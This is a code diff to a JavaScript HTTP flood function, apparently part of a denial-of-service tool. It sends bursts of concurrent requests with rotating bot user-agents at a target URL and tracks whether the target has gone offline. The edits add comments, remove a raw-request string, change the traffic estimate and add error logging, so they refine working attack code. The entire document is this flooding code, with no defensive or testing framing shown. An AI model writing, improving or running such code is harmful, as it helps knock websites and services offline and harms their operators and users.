@@ -16,8 +16,9 @@ async function httpFlood(target, duration, intensity) {
       port = parseInt(port, 10);
     }
 
+    // Consider using a more robust method to check connectivity *before* the flood
     const protocol = url.protocol === 'https:' ? 'https' : 'http';
-    const interval = Math.max(1, 50 / intensity);
+    const interval = Math.max(1, 50 / intensity); // Throttle requests
 
     const userAgents = [
       'Noodles-Bot v3.0',
@@ -31,7 +32,8 @@ async function httpFlood(target, duration, intensity) {
       const promises = [];
       for (let i = 0; i < intensity; i++) {
         const userAgent = userAgents[Math.floor(Math.random() * userAgents.length)];
-        const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
+        // Removed manual payload construction as it's redundant with the fetch headers
+        // const payload = `GET ${path} HTTP/1.1\r\nHost: ${host}\r\nUser-Agent: ${userAgent}\r\nAccept: */*\r\nX-Noodles-Bot: Active\r\nCache-Control: no-cache\r\nConnection: keep-alive\r\n\r\n`;
 
         const promise = fetch(target, {
             method: 'GET',
@@ -41,17 +43,19 @@ async function httpFlood(target, duration, intensity) {
               'Cache-Control': 'no-cache',
               'Connection': 'keep-alive'
             },
-            mode: 'no-cors'
+            mode: 'no-cors' // Necessary for client-side execution but limits server feedback
           })
           .then(response => {
             if (response.ok) {
               packetsSent++;
-              mbps += payload.length / 1000000;
+              // Estimate data size based on headers + some average body size.  The payload.length method was removed.
+              mbps += (response.headers.get('content-length') || 1024) / 1000000;
             } else {
               targetStatus = 'Unresponsive';
             }
           })
           .catch(error => {
+            console.warn("Request failed:", error.message); // Log the specific error
             targetStatus = 'Offline';
           });
         promises.push(promise);
